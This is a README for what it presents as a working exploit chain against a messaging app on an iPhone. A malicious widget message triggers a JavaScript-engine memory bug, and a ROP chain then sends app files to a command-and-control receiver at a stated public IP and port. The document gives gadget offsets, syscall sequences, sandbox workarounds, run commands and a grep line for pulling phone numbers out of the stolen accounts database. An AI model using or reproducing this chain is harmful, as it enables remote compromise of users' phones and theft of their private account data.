# iOS 27 Telegram widget exploit: PoC (working)

Target: **iPhone 17e (iPhone18,5), iOS 27.0 (24A437)**, Telegram stock 13.2 (36535).
Primitive: QuickJS PR#1827 (stale RegExp bytecode UAF) reachable from an in-chat
`tgwidget` message → arbitrary read/write in the Telegram process → ROP chain →
file exfiltration to a TCP C2.

**Status: WORKING**: exfiltrated `lockState.json` (3039 B) and the first bytes of
`accounts-metadata/db/db_sqlite` from the stock app to the C2.

## Files

- `ios17_rw3.html`; **the working payload** (open→read→write, 3039 bytes,
  path `lockState.json`). zlib 4022, source-size-neutral vs the proven `fixed_lit`.
- `ios17_rw3_db.html`; same chain, path `accounts-metadata/db/db_sqlite` (120 chars).
- `ios17_rw3_db2.html`; same, read/write length 9999 (schema + first data pages).
- `ios17_fixed_lit.html`; the debug/proven base that reaches `connect()`.
- `ios17_state_sf.html`; original winning artifact (sendfile; kept for reference).
- `mkpayload.py`; payload validator/generator (syntax, zlib limits, wrapper diff,
  UB slot map dump).
- `c2_loop.py`; the TCP exfil receiver (port 44499, loops, saves `exfil_N`).
- `exfil_lockstate_3039.bin`; proof: the real lockState JSON.
- `exfil_db_3039.bin`; proof: SQLite header of the accounts DB.
- `c2_console.log`; CONN/GOT log from the device.

## Chain (why it works)

```
socket(AF_INET,SOCK_STREAM,0) -> dup2(sock,40) -> connect(40,C2:44499)
 -> open(path, O_RDONLY, 0)          [flags must be 0: 0x1000=O_RESOLVE_BENEATH
                                      with an absolute path returns ENOTCAPABLE]
 -> read(open_ret, BUF, N)           [read(2) is allowed; sendfile(2) is SIGSYS]
 -> write(40, BUF, N)
```

Gadgets (TelegramUIFramework): `G_CALL=base+0x3292C`, `G_X0=base+0x628A2C`,
`G_LOAD=base+0x172D96C`; libc deltas from `free`: read `+0xB79B4A44`,
write `+0xB79B3B8C`, open `+0xB79B52BC`, mkdir `+0xB79B4F9C`, socket
`+0xB79B3FB4`, connect `+0xB79B9998`, dup2 `+0xB79C3138`, sendfile
`+0xB79C3F24` (SIGSYS), `_pthread_exit` `-0x88AC`.

**Critical detail**: `Of` (dup2) is referenced by TWO table blocks
(0x1A0 socket→40 and 0x5A0 file→41). The `read` must use a different
variable (`Pf`, the now-useless mkdir) only at 0x5A0; `Of` stays dup2.
The `write` replaces `sendfile` at 0x710. All edits keep the source length
identical (delta 0) so the heap geometry of the proven `fixed_lit` is kept.

## Run (one command, terminal only)

```
cd lab/ios27_20261106
pkill -f c2_loop.py || true     # free port 44499
python3 run_poc.py              # default payload: ios17_rw3_db14k.html
```

`run_poc.py` sends the widget, listens on 44499, saves the received chunk to
`/tmp/opencode/poc_last_exfil.bin` and prints a censored report in the terminal.
It does **not** post anything to the chat: the only chat message is the widget
itself (the exploit delivery).

Then on the phone: **restart Telegram and open the bot chat**. The exploit is a
heap-geometry lottery: if the widget renders empty or nothing connects, restart
the app and open the chat again.

## Run (manual, with the raw receiver)

1. Start the receiver on the host (public IP `84.221.240.183`, port 44499,
   hairpin NAT; the phone is on the same LAN):
   ```
   python3 c2_loop.py 44499
   ```
2. Send the payload as a widget to the bot chat (Bot API `sendWidget`,
   `chat_id` = the account user id):
   ```
   python3 mkpayload.py send ios17_rw3_db2.html
   ```
3. On the phone: **restart the Telegram app** (swipe up) and open the bot chat.
   The widget boots when visible; the exploit is a **heap-geometry lottery**
   (each run may render empty/crash). The renderer can break after a crash:
   restart the app before each attempt.
4. The receiver prints `CONN ...` and `GOT <n> <bytes> ...`; the file is saved
   as `exfil_<n>`.

## Reading the DB

`accounts-metadata/db/db_sqlite` is 450 pages × 4096 B. The read starts at
offset 0, so `db2` (9999 bytes) returns the SQLite header + page 1 (schema) +
the first data page. The account/phone rows are in the early data pages.
Use `strings -a exfil_<n> | grep -E '\+?[0-9]{7,15}'` and inspect the
`accounts` table cells. For larger coverage raise the length at `[688]`
(`yn(Yf,688,9999n)`) to e.g. `65535n` (source delta +1, same lottery).

## Gotchas (learned the hard way)

- `sendfile` is rejected by the iOS sandbox with **SIGSYS** (`x16=337`): never use it.
- `open` with flags `0x1002` (`O_RESOLVE_BENEATH`) on an absolute path fails
  `ENOTCAPABLE`; use 0.
- `Wf` (the Uint8Array data pointer found by the magic scan) must be valid,
  otherwise the connect uses a null sockaddr and no CONN appears.
- Every attempt needs a fresh app (the widget engine/renderer degrades after
  a crash: even a trivial widget shows empty until the app restarts).
- The DDI/Frida attach is flaky on this setup; the syscall harness
  (`frida_syscall_test.py`) is only for validation.

## Proof

- `GOT 24/25: 3039 bytes`, sha256 `641ebc34…` = real `lockState.json`.
- `GOT 26: 3039 bytes`, sha256 `72a90d91…` = `SQLite format 3` header of
  `accounts-metadata/db/db_sqlite` (page size 4096, page count 450).
